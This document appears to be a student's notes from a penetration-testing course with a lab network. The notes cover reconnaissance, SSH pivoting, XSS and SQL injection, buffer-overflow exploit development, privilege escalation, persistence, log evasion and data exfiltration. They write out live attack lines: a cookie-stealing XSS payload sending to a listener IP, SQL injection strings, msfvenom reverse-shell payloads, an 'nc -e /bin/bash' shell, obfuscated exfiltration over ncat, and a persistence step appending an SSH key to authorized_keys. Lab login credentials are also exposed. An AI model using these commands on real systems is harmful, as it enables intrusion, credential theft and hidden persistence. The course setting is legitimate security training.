CTF: http://10.50.20.250:8000
jump box: 10.50.45.124
pass: password


ctf user:truk-007-m
PASS: lLLtxxX1XXJvRuX


Day 1) 
-------------------------------------------------------------
Penetration testing)  breaking into a network and finding the weaknesses

6 phases: 

phase 1: mission definition) 
  - define goals and targets
  - determine scope of mission
  - define RoE
    
phase 2: Recon )
  - info gathering without interacting with that sepecific target
  - ex: whois, socials, job postings ect.

phase 3: footprinting)
  - pings, portscans, websites, emails,

phase 4: exploitation and inital access) 
  - gaining access
  - getting a foothold via what ever means: email, website, mis configs ect.

phase 5: Post-exploitation) 
  - establish presistance
  - esclate privileges
  - cover your tracks
  - exfiltrate target data

phase 6: document mission) 
  - document and report mission details

Pen test reporting: 
  - opnotes (what you did as the operator)
  - formal reporting: 
      - executive: condenced and run down of what happened
      - tecnical summery is for the nerds like myself


why reporting and what the resons?
  - to help companys fixs the holes they have in there system.
  - why do i care for reports?
      - stay organized and i know what im doing and where im going and whats happening around me. like account ability, it helps for others to prep, and saves your back incase others break into the system. 

-------------------------------------------------------------------------------------

Scanning and Reconnaissance
---------------------------
what is reconnaissance? 
  - what does the target look like?
  - whats behind it?
  - what ips are there?
  - what ports and services

Open source intell
   - email
   - social media
   - job listings


Documentation
  - whats inside?
  - what needs doccumented
  - screen shots
  - timelines
  - be organized

**mid map is one way to stay organized**

Collection and use
  - used in different operations
  - ipaddresses
  - ports
  - volnerabilities

Limitations on collections
  - rules: us person cant be collected on, Rules of engagement (RoE),
  - different factors

data to collect 
  - web data
      - cache content, proxy web application, command line intergration
  - sensitive data
      - busniss data, filings, historyical and public listings 
  - publicly accessaible
      - Physical address, phone #, email address, user names, search engine data, web and traffic cameras, wireless access point data
  - social media
      - facebook, twitter(X), instagram, people searches,registry, wish list
  - domain and IP data

HTML (web script) 
  - client-side interpretation
  - utilizes elements
  - typicaly redirects to another pager for server-side interatction
  - cascading stylesheets




script (website)

pip install lxml requests
--------------------------------
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
---------------------------------


scraper script
---------------------------------
#!/usr/bin/python3

# IDENTFYING SPECIFIC PYTHON MODULES THAT WILL BE USED IN SCRIPT
import lxml.html
import requests

# STATING A FUNCTION THAT THE SCRIPT CONTENT IS ATTACHED TO
def main():

# THIS OUTLINES THE WEBSITE AND DEFINES THE CONTENT ON THE PAGE TO BE TARGETED
  page = requests.get('http://quotes.toscrape.com')
  tree = lxml.html.fromstring(page.content)

# THIS OUTLINES THE HTML TAG AND ATTRIBUTE TO BE TARGETED FOR THE DATA YOU WANT TO toscrape
# "small" IS THE HTML TAG AND "class" IS THE HTML TAG ATTRIBUTE
  authors = tree.xpath('//small[@class="author"]/text()')

# PRINTS THE ABOVE VARIABLE WITH Authors: AS THE HEADER
  print ('Authors: ',authors)

# Future Code for json output
# output = []
# for info in zip(titles,prices, tags, total_platforms):
#     resp = {}
#     resp['title'] = info[0]
#     resp['price'] = info[1]
#     resp['tags'] = info[2]
#     resp['platforms'] = info[3]
#     output.append(resp)

if __name__ == "__main__":
    main()
-----------------------------------------------------


demo commands: 

F12 developers console 
scraping 
  - 
1) scanning
   - nmap --script-help http-enum
   - (port 80 enum) nmap --script http-enum 10.50.45.252
   - nmap -
2) sockets
   - ssh student@<ip>  -L 2222:<target>:22
   - ssh -M -S /tmp/jumpbox  -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null
    - ssh -S /tmp/jumpbox <anything>
    - (making new runnel) ssh -S /tmp/jumpbox user@ip -O forward -L 2222:192.168.0.10:22
    - netstat -antup | grep 2222
    -  ssh -M -S /tmp/jumpbox -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null student23@127.0.0.1
    -  
    - scp -o ControlPath=/tmp/jumpbox user@ip:/etc/passwd /tmp/password
    - ssh -S /tmp/jumpbox <anything> -D 9050
    - proxychains nmap -sT -Pn -p 80 192.168.0.10 2> /dev/null
  
    - Scaning a network
    - --------------------------------------------------------------------------
    - for i in {1..254} ;do (ping -c 1 192.168.150.$i | grep "bytes from" &) ;done
    - proxychains scraper.py <website> 

------------------------------------

advanced scanning techniques
  - Host discovery
      - find hosts that are online
  - port enumeration
      - find ports for each host
  - port interrogation
      - find what service is running
   
Nmap script
-----------------
why use scripts? 
  - more consistent less error, time
benifits
  - network discovery
  - version detection
  - vulnerability detection
  - backdoor detection
  - volnerability detection
Dirctory: /usr/share/nmap/scripts
  - nmap --script  -help|-args|-args-file|-trace
  - nmap --script=finger

nmap <F5 i<C-R>=strftime("%Y-%m-%d-%H:%M:%S")<CR>-- 

----------------------------------------------------------------------------------------------------------------------------
Day 2) 

Web exploitation 
------------------------
server hosts something cliet gets that thing

http is how we communcate with servers 
  - tools: wireshark tcpdump
  - GET
  - POST
  - HEAD
  - PUT
  - DEV CONSOLE
  - repsonse codes
      - 10X == info
      - 2XX success ect
  - wget command to get cookies
    - wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
  - enumeration
    - robots.txt
    - tools: nse scripts nikto burp suite
    - http-enum.nse
    - http-robots.txt.nse
  - cross site scripting
      - reflected (most common)
          - exploiting a volnerable browser not server 
          - stealing cookies
              - <script>document.location="http://10.50.41.112:8000/cookie.php?username=" + document.cookie;</script>
              - 
      - server-side injection
      - malicious upload
         - see what it wants
         - find your file
         - upload your file


    ssh
    ---------------------
    ssh-keygen -t rsa -b 4096
    upload public key
    ssh <user>@ip -i 
-----------------------------------------------------------------------------------------------------------------------------
Day 3) SQL 

commands standard
--------------------
- select  - extracts data from a data base 
- union   - used to combind  the rest of two or more selected statements 
- use     - selects the DB to use 
- update  - updates data in a database 
- delete  - deletes data from the DB 
- insert into  - Inserts new data into a database
- create database  -   Creates a new database
- alter database   -   Modifies a database
- create table     -   Creates a new table
- alter table      -   Modifies a table
- drop table       -   Deletes a table 
- create index     -   Creates an index (search key)
- drop index       -   Deletes an index



commands by instructor for Sql 
--------------------------

- mysql (sequil console)
- show databases;
- show tables from session;
- select * from session.<table>;    (example select * from session.user; ) (select name from session.user)
- use <DB table> 
- describe <table>
- select * session.car UNION select tireid,name,size,cost,1,2 from tires

SQL injection
------------------
unstanitized : imput fields can be found using single quite ' 
an aditional single quote will allow aditional statements/clauses 
validation: checks input to ensure it meets criteria (doesnt contain a single quote ' ) 

example of injections ish:  tom' OR 1='1


a semi colen ; can be used to combind statements. 

some sites wont allow stakcing but we can use union to stack it 
example)  UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
using # or -- tells the database to ignore everything else 


inject imput = 1 OR 1=1; #


SQL inject messaging
----------------------
use a ' to see for error message 
if error use : tom ' OR 1='1 
login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1 
post informs
get gives
use developer consle under network to see where it sends you 


Blind injection
------------------------
has no error messages 
@@version = finds sql version 
Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
Selection=2 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema=database()   == the table in use 


exclation
-----------------
escape sanitazation to get root privs 
*******************
email\',<level>) ; # or email\',<level>) ; -- 


general sql injection 
----------------------
UNION select <column> FROM <databe.table>

table_schema
table_name
column_names
 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema=database()

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Day 4) 

Reverse engineering 
----------------------------
16 general registers 
%rax - the first return register 
%rbp - the base pointer that keeps track of the base of the stack
%rsp - the stack pointer that points to the top of the stack

common terms 
------------------------------------
Heap - Memory that can be allocated and deallocated
Stack - A contiguous section of memory used for passing arguments
General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
Control Register - A processor register that changes or controls the behavior of a CPU
Flags Register - Contains the current state of the processor


memory offset
--------------------------
instruction pointer 
64 bit - RIP 
32 bit - EIP
lower 16 bits - IP (instruction pointer) 

common instrucntion pointers 
--------------------------------------------
MOV - move source to destination
PUSH - push source onto stack
POP - Pop top of stack to destination
INC - Increment source by 1
DEC - Decrement source by 1
ADD - Add source to destination
SUB - Subtract source from destination
CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP - Jump to specified location
JLE - Jump if less than or equal
JE - Jump if equal

-------------------------------------------------------------------------------------------------------------------------------------------------
Day 4) 

post exploitation
----------------------
ssh overview 
linux: 
- ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
Windows:
- port proxy
- netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
- netsh interface portproxy show all
- netsh interface portproxy delete v4tov4 listenport=<LocalPort>
- netsh interface portproxy reset



ssh keys
----------------------
chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4


control sockets
--------------------
creation
- ssh -M -S /tmp/s -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null user@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
access to the socket
- ssh -S /tmp/s <anything> 
making a new tunnel
-ssh -S /tmp/jumpbox user@ip -O forward -L 2222:192.168.0.10:22

scp 
====
upload 
- scp -o 'ControlPath=<control/socket/location>' [LOCAL/FILE/TO/TRANSFER] [USER]@<TARG_IP>:[/DEST/FILENAME]
- scp -o 'ControlPath=/tmp/s' /tmp/netcat root@127.0.0.1:/tmp/netcat
download
- scp -o 'ControlPath=<control/socket/location>' [USER]@<TARG_IP>:[/FILE/TO/DOWNLOAD] [/LOCAL/DOWNLOAD/FILE/LOCATION]
- scp -o 'ControlPath=/tmp/s' root@127.0.0.1:/tmp/netcat .



bringing the socket over??
--------------------------------
ssh -S /tmp/s x@x
scp -o 'ControlPath=/tmp/s' x@x:<Path>



user enumaeration
-----------------
windows
=================
- net user
- tasklist /v
- tasklist /svc
- ipconfig /all
- qwinsta
- wmic useraccount get name,sid
- net localgroup
- netstat /anob
- route print
- arp -a
===============
linux
==============
- cat /etc/passwd
- last
- groups
- id
- w 
- ps -elf
- chkconfig                   # SysV
  systemctl --type=service    # SystemD
- ip a             # SystemD
  ifconfig -a      # SysV (deprecated)
- netstat -ano
- ip r
- ip n
- /etc/hosts



data exfiltration
----------------------

Ssh transcript 
- ssh <user>@<host> | tee
  
windows obfucation
- type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out   |  (decode)  Get-Content translated.out | %{$_ -replace 'b','a' -replace 'c','b' -replace 'd','c'}
certutil -encode <file> encoded.b64   | (decode)   certutil -decode data.b64 data.txt

linux obfuscation
- cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt   | (decode) cat shifted.txt | tr 'b-zA-Z0-9a' 'a-zA-Z0-9'
cat <file>> | base64 >> base64.txt          | (decode)  cat base64ed.txt | base64 -d

encryption trasport 
- scp <source> <destination>
  ncat --ssl <ip> <port> < <file>

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
day 5) 


exploit development 
-----------------------------
Heap - Memory that can be allocated and deallocated
Stack - A contiguous section of memory used for passing arguments
Registers - Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP) - a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP) - Contains the address of the next available space on the stack
Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode - The code that is executed once an exploit successfully takes advantage of a vulnerability



commands 
-----------------
gdb ./<file> 
info functions 
pdisass <function i want> 
run it with the non repeating string 
evn - gdb ./func (finds what the memory addresses will be) 
unset env LINES
unset env COLUMNS
run (crash the program) 
info proc map
find /b <after the heap>, <before the stack> 0xff, 0xe4 
put the memories into the script and conver to big endian 
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python  (payload) 
1) if it wants user input: <program> <<<$(./mybuff.py)  if not then <program> $(./mybuff.py)
                                  (send the output as a variable)

---------------------------------------------------------------------------------------------
day 6) windows


use string length 2500

steps 
-------------
start immunity bugger 
switch to running 
run the script 
get the EIP 
go to buffer overflow pattern and get the offset 
put it in script 
!mona modules (in the bottom) find no priv .dll
type this !mona jmp -r esp -m "<the dll>" 
convert address to big endian 
make payload :  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.112 lport=4444 -b "\x00" -f python 
msfconsole: use multi/handler set payload to what we used, set lhost to 0.0.0.0 and lport to the one we used, run 


-------------------------------------------------------------------------------------------------------------------------------------------------------

Day 7) 

Linux privlage exploitation
------------------------------

privilage esclation, persistence, and covering your tracks 
- adding and hijacking accounts
- boot process
- cron job (Important for test)
- ssh keys



privilage esclation
-------------------------
- enumeration for privilage esclation
    - sudo -l (see what the user can do)
      - ls -la /etc/sudoers (master file for permistions)
      - sudo !!
    - id (look for wheel its a priv group)
    - SUID/GUID
        - execute perms as owner if its set.
        - find / -type f -perm /4000 -ls 2> /dev/null  (find all SUID bits set)
        - find / -type f -perm /2000 -ls 2>/dev/null
        - https://gtfobins.github.io/  (plug in different commands)
        - nc <Localhost or 127.0.0.1> port -e /bin/bash 


Insecure permissions 
----------------------------
- CRON (first place to look on test) 
  - https://crontab.guru/ (helps with what the job is doing)
  - https://www.adminschoice.com/crontab-quick-reference (indepth CRON)
  - /etc/crontab
  - /var/spool/cron/crontabs,atjobs
  - hijack a cron job 
- world-writable files and directories
  - /tmp (perm 777)
  - /var/tmp
  - /run
  - /dev/shm
  - ll , ls -latr
- dot'.' PATH
  - echo $PATH
    /etc/sudoers : "<name> ALL=(ALL) NOPASSWD=ALL"


presistance
---------------------
- users
- init
- keys
- cronjob/ cron 
- adding or hijacking accounts
  - adding is new user to the environment
  - hijacking is taking conrol of a newer users
- boot process
  - /etc/systemd/system
  - /etc/systemd/startup 
  - /etc/systemv/system 
  - /etc/init.d/acpid



covering your tracks
------------------------
- auditing and logging
- log cleaning
  - testing
- atifact
  - whats left behing
  - ex) logs, tools,
- unset HISTFILE
- ps -p1
- ausearch -p 22
- journalctl --verify
- /etc/rsyslog.conf , /etc/rsyslog.d 




windows exploits 
-----------------------------------\
pressitance
---------------------
scheduled tasks -> tigger ,services -> startup , registry (boot)-> hklm..\run,runonce


privilage esclation
-----------------------
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
  - procmon 
  - GetSystemDirectory() = C:\windows\system32
  - GetWindowsDirectory() = C:\windows

uac settings: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  - aslnvoker
  - highestAvailable

logs
  - 4964 faild logon ??
  - application
  - security
  - setup
  - system

*procmon and putty is needed* 

demo
--------------
search bar: scheduled tasks 
search bar: services 
fail safe mmc -> add snap in -> event viewer, services, task scheduler 
find the exe
view ...
event viewer: proccessname is <name of proccess>, result is NAME NOT FOUND, path contains .dll 
go to linops and create the dll: msfvenom -p windows/exec CMD='cmd.exe /c "<command you want>" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
scp the dll over
run the proccess 




audit commands
-----------------
auditpol /get /category:* 
auditpol /get /category:* | findstr /i "success failure"         *(need admin privliges)*
event IDs 4624,4625 success and fail
  - 4720 acc created
event viewer use to to look at system logs 






























ports 3333,7418=192.168.28.111
      9638=10.100.28.40:80
      9999:10.100.28.55:80
      3375:192.168.28.100



comerade

echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIxv7ahuM2lTWIsG6zH4+yR6qnxPbeobVlXv1fyz/rS4OiO8E/ntElyhMgQlYG9P/cPJpqJKFfihqtZDciRxBE1XoklbWpuW+CYsk2zOIl1QZL0jHaFGSEfzY7ZUqkKehbwlI0s33rx0JsBvIz1RQTUzImcFpi1IW8V1YmWpR6Sw+e/wSVFr0on4mPRO0TuO/xJ0Ie7RcQt2SFVxkZXpJCrFEg9UikBaWtJEmUyTILyfVsJcMgG21y19GKGUWJu92Qjy29oj39zhaXc1R1aIBIpp1vojEwhqMm4qRc30sQWJz3RIriItmuh8oBV9sglH20ZlTt/s6/PWCw6huErfXW5IeNEyN6znf2a0ZAyEKJtQK6tCcycCQjRHj18iSuCeTVPSvF+ZBBUbI0jV6M5bXYfX71Cp4/Hmdx9wewFPNJR2sQ1PHO98kYfhMIKlRLAnA6DCo3B6ukalGduflag/iiK1ze8Ka5GROxnNpelZGv3a7sf+g52kRCHPTr3HDR2Po3QwKJBb38CBtlQ3XAh6DRuQsVSxBWCuM4xKb60s/RbyVKmx/d+Og303DzTwe+m2BBaXRG3aSPHkWA3RRtnbAxN4lqjBtm7kEoICyww8Dk8zOMydw+Qw4KV7TRT7RO/B0s8ypUCE8FaHdb1RLUInYIk7q/3z8gXBsQGOyR3PLs9Q== student@lin-ops'>> /var/www/.ssh/authorized_keys


